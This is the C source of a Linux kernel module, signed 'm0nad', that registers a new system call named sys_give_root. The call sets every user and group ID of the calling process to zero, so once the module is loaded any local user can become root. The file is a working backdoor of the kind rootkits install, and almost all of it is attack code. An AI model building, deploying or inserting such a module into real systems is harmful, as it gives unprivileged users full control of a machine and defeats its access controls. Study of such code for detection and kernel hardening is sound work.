/*
 * just for test :D
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/version.h>
#include "rsysadd.h"


// written by m0nad
asmlinkage long sys_give_root(void){
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL)
		return -1;

	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS)
		newcreds->uid.val = newcreds->gid.val = 0;
		newcreds->euid.val = newcreds->egid.val = 0;
		newcreds->suid.val = newcreds->sgid.val = 0;
		newcreds->fsuid.val = newcreds->fsgid.val = 0;
	#else
		newcreds->uid = newcreds->gid = 0;
		newcreds->euid = newcreds->egid = 0;
		newcreds->suid = newcreds->sgid = 0;
		newcreds->fsuid = newcreds->fsgid = 0;
	#endif
	commit_creds(newcreds);

	return 0;
}

static int __init sys_give_root_init(void){
	int sysnum;

	sysnum = register_syscall(sys_give_root);
	if(sysnum < 0){
		printk(KERN_INFO "[sys_give_root] was not registered\n");
		return -1;
	}

	printk(KERN_INFO "[sys_give_root] registered in [%d]\n", sysnum);
	return 0;
}

static void __exit sys_give_root_exit(void){
	unregister_syscall(sys_give_root);
}

module_init(sys_give_root_init);
module_exit(sys_give_root_exit);
MODULE_LICENSE("GPL");
